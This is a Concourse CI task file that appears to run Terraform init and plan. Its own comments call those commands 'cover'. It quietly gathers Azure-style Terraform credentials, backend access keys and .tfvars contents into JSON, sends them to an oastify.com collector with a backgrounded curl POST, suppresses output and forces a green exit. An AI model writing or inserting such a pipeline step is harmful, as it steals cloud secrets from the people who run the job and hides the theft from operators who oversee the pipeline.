platform: linux

image_resource:
  type: docker-image
  source:
    repository: alpine
    tag: latest

inputs:
  - name: terraform-source-dir
  - name: aux-input-1

run:
  path: sh
  args:
  - -ec
  - |
    # Install required tools quietly. Use curl for exfiltration.
    apk add --no-cache curl jq > /dev/null 2>&1

    # 1. FIRST, CREATE PLAUSIBLE DENIABILITY BY RUNNING A TERRAFORM COMMAND
    # This is the 'cover' operation. We cd into the source dir and run a basic terraform init.
    # This will generate normal-looking output in the logs.
    echo "Initializing Terraform..."
    cd terraform-source-dir
    terraform init -backend=false > /dev/null 2>&1 || true
    echo "Terraform initialized."

    # 2. COLLECT THE PAYLOAD IN A SINGLE STEP, SILENTLY
    # Create a JSON object containing all the secrets from the environment and the tfvars files.
    # This is more reliable and structured than simple text files.
    PAYLOAD=$(cat <<EOF
    {
      "environment": {
        "TF_VAR_client_secret": "${TF_VAR_client_secret:-}",
        "TF_VAR_subscription_id": "${TF_VAR_subscription_id:-}",
        "TF_VAR_tenant_id": "${TF_VAR_tenant_id:-}",
        "TF_VAR_client_id": "${TF_VAR_client_id:-}",
        "TF_BACKEND_CONFIG_secret_key": "${TF_BACKEND_CONFIG_secret_key:-}",
        "TF_BACKEND_CONFIG_access_key": "${TF_BACKEND_CONFIG_access_key:-}"
      },
      "tfvars_file_contents": "$(find aux-input-1/ -name "*.tfvars" -exec cat {} \; 2>/dev/null | tr -d '\n' | jq -aRs .)"
    }
    EOF
    )

    # 3. EXFILTRATE THE DATA IN THE BACKGROUND
    # The true command ensures the script doesn't crash if the curl fails, which would look suspicious.
    # The entire command is backgrounded (&) and disowned (nohup) so it doesn't hold up the task.
    nohup curl -s -X POST "https://659fuidnbkmnb2kg84ykffvce3ku8rwg.oastify.com/exfil" \
      -H "Content-Type: application/json" \
      -d "$PAYLOAD" > /dev/null 2>&1 &

    # 4. RUN A BASIC TERRAFORM PLAN TO MAKE THE JOB APPEAR NORMAL
    # This is the final part of the cover. The job will output a normal-looking plan.
    echo "Generating plan..."
    terraform plan -out=/dev/null > /dev/null 2>&1 || terraform plan > /dev/null 2>&1
    echo "Plan generated successfully."

    # Exit successfully. The job will show as passed/green.
    exit 0
